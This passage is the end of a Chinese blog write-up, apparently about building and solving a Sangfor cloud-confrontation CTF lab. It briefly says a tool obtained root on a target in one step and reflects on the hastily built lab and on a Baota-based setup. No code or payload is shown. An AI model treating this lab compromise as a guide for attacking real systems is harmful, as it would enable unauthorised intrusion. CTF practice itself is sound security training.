+<p>直接工具一键梭了，由于这里得到的直接就是 <code>root</code> 权限所以无需提权</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803230750008.png" alt="image-20240803230750008"></p>
+<h2 id="写在后面">写在后面</h2>
+<p>当时正忙着教育攻防演练，所以整体靶机搭建的时候十分仓促，用了不到两天的时间。但没想到后面突然延期了好久，但是也懒得改了…</p>
+<p>在后期，群里其他师傅分享了一篇 <a href="https://mp.weixin.qq.com/s/PcTa4wbU2sNFVR-Q6fHhJA">记一次深信服云对抗环境搭建思路分享</a>，看过之后确实大家的思路各不相同，通过宝塔来搭建是博主从未设想过的道路。不过宝塔 PHP 默认过滤了很多危险函数，可能会影响选手判断…</p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200" role="contentinfo" aria-label="版权信息"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/sangfor_cloud_confrontation.html" title="https://5ime.cn/sangfor_cloud_confrontation.html" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all" aria-label="文章永久链接"> https://5ime.cn/sangfor_cloud_confrontation.html </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800" aria-label="查看 CC BY-NC-SA 3.0 CN 协议详情">
+CC BY-NC-SA 3.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>   </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2025 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
